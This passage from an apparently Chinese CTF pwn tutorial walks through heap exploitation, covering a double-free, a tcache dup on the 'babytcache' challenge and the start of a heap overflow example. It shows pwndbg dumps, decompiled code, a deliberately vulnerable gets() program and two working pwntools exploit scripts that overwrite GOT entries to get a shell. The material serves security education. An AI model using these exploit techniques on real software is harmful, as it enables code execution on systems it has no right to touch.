0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x00000000006026a0	0x0000000000000000 #bp -&gt; 0x6026a0</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000 #bp -&gt; 0x602670</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看到上面释放了之后形成了一个双向链表，如果我们继续申请内存，就会申请在0x602670处，这里我们申请到0x602660，其ASCII码为<code>&amp;</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 2</span><br><span class="line">25 `&amp;`</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000602660	0x0000000000000000 #bp -&gt; 0x602660</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们继续申请内存就会申请到0x602670处的地方</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 3</span><br><span class="line">25 cccccccc</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000602660	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6363636363636363	0x0000000000000000 #'cccccccc'</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>如果我们继续申请，就会覆盖0x602670处的内容，也就是覆盖这个双链表的内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 4</span><br><span class="line">25 deadbeef</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x6665656264616564	0x0000000000000000 #'deadbeef'</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6363636363636363	0x0000000000000000 #'cccccccc'</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>因为0x602670处指向了0x602660，所以我们再次申请内存就会写在0x602660处</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 5</span><br><span class="line">25 dddddddd</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x6464646464646464	0x0000000000000000 #'dddddddd'</span><br><span class="line">0x602670:	0x6665656264616564	0x0000000000000000 #'deadbeef'</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6363636363636363	0x0000000000000000 #'cccccccc'</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>既然0x602660处的地址可以利用，那意味着我们可以将malloc()函数修改为sh()的地址，然后getshell，我们先查看一下函数的地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# objdump -R heap</span><br><span class="line"></span><br><span class="line">heap：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601078 R_X86_64_COPY     stdout@@GLIBC_2.2.5</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5</span><br><span class="line">0000000000601030 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5</span><br><span class="line">0000000000601038 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5</span><br><span class="line">0000000000601040 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5</span><br><span class="line">0000000000601048 R_X86_64_JUMP_SLOT  malloc@GLIBC_2.2.5</span><br><span class="line">0000000000601050 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5</span><br><span class="line">0000000000601058 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7</span><br><span class="line">0000000000601060 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = &#123;void (char *)&#125; 0x4007d7 &lt;sh&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们将地址改为sh()之后还需要一个参数’sh’，我们需要在0x601040处写入’sh’，也就是get函数的地方，最后调用malloc的时候sz替换为’sh’的地址即可，exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./heap'</span>)</span><br><span class="line">elf =ELF(<span class="string">'./heap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send( x + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">molloc</span><span class="params">(i,s)</span>:</span></span><br><span class="line">    cmd(<span class="string">'1 %d\n25 %s'</span>%(i,s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(i)</span>:</span></span><br><span class="line">    cmd(<span class="string">'2 %d'</span>%i)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(i)</span>:</span></span><br><span class="line">    cmd(<span class="string">'3 %d'</span>%i)</span><br><span class="line"></span><br><span class="line">molloc(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">molloc(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">molloc(<span class="number">2</span>,p64(<span class="number">0x0601040</span>)) <span class="comment"># 指向 0x601040 处地址的内容</span></span><br><span class="line">molloc(<span class="number">3</span>,<span class="string">'aabb'</span>)</span><br><span class="line">molloc(<span class="number">4</span>,<span class="string">'aabb'</span>)</span><br><span class="line">x = p64(<span class="number">0x6873</span>) + p64(<span class="number">0x4007d7</span>)  <span class="comment"># 0x601040 内容修改为 system('sh')</span></span><br><span class="line">molloc(<span class="number">5</span>,x) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1 6'</span>)</span><br><span class="line">p.sendline(<span class="string">'6295616 aaaaaaaa'</span>)  <span class="comment"># 执行 0x601040 处内容 0x601040 = 6295616 </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Example-Two-1"><a href="#Example-Two-1" class="headerlink" title="Example Two"></a>Example Two</h3><p><strong>题目链接</strong></p>
<p><a href="https://github.com/ThunderJie/CTF-Practice/blob/master/CTF-Pwn/babytcache/babytcache" target="_blank" rel="noopener">babytcache</a></p>
<p>这道题需要了解一些tcache的知识，<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#tcache-dup" target="_blank" rel="noopener">CTF-Wiki</a>上有详细的介绍，简单来说就是tcache_put() 的不严谨 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list，这里其实就有点像Double Free的感觉，只是Double Free不能连续free而这里可以，运行了解一下程序，是一个常见的管理系统</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# ./babytcache </span><br><span class="line">NoteBook v0.1</span><br><span class="line">1.add a note</span><br><span class="line">2.delete a note</span><br><span class="line">3.show a note</span><br><span class="line">4.exit</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
<p>IDA分别分析一下每个函数的内容</p>
<p><strong>add_note</strong></p>
<p>这里将创建的地址都放在了ptr[]的地方，也就是0x6020E0处</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_a_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_6020C0 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Full!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">  v1 = dword_6020C0;</span><br><span class="line">  ptr[v1] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line">  sub_4008A6((__int64)ptr[dword_6020C0], <span class="number">0x50</span>u);</span><br><span class="line">  ++dword_6020C0;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>delete_note</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v0 = sub_400920();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; dword_6020C0 )</span><br><span class="line">    <span class="built_in">free</span>(ptr[v0]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of range!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>show_note</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_a_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = sub_400920();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; dword_6020C0 )</span><br><span class="line">    result = <span class="built_in">puts</span>(ptr[v1]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"out of range!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们首先创建一个note,然后释放三次</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap</span></span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 593, </span><br><span class="line">  fd = 0x300000000, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603250 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 97, </span><br><span class="line">  fd = 0x603260, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6032b0 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 134481, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0x60 [  3]: 0x603260 ◂— 0x603260 /* '`2`' */ #free three times</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>这道题并没有给system函数和’/bin/sh’,所以我们需要泄露出system函数的地址，然后想办法改got表。</p>
<p>我们将0x6020e0位置的指针改为puts函数的got表指针,然后就可以泄露puts函数的在libc的地址,计算出system函数的地址,然后用同样的方法将puts的got表覆盖为system函数的地址,最后调用puts()实现getshell,偏移的计算是在接受到puts函数地址的时候,用vmmap打印出libc地址,然后相减就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./babytcache'</span>)</span><br><span class="line"></span><br><span class="line">symbol = ELF(<span class="string">'./babytcache'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(content)</span>:</span></span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	r.sendline(<span class="string">'1'</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">	r.sendline(content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line"></span><br><span class="line">	r.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	r.sendline(<span class="string">'2'</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">	r.sendline(<span class="string">'%d'</span>%index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span><span class="params">(index)</span>:</span></span><br><span class="line"></span><br><span class="line">	r.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	r.sendline(<span class="string">'3'</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">	r.sendline(<span class="string">'%d'</span>%index)</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">'aaaaaaaa'</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_note(p64(<span class="number">0x6020e0</span>+<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">add_note(p64(symbol.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">show_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = (u64(r.recv(<span class="number">6</span>)+ <span class="string">'\x00\x00'</span>)) <span class="comment">#receive 'puts'</span></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">padding1 = <span class="number">0x809c0</span></span><br><span class="line"></span><br><span class="line">padding2 = <span class="number">0x4f440</span></span><br><span class="line"></span><br><span class="line">libc_addr = puts_addr - padding1</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + padding2</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_note(p64(symbol.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">add_note(p64(system_addr))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.sendline(<span class="string">'0'</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h2><p><strong>漏洞介绍</strong></p>
<p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块，我们用两个例子来说明这个问题。</p>
<h3 id="Example-One-2"><a href="#Example-One-2" class="headerlink" title="Example One"></a>Example One</h3><p>创建overflow.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
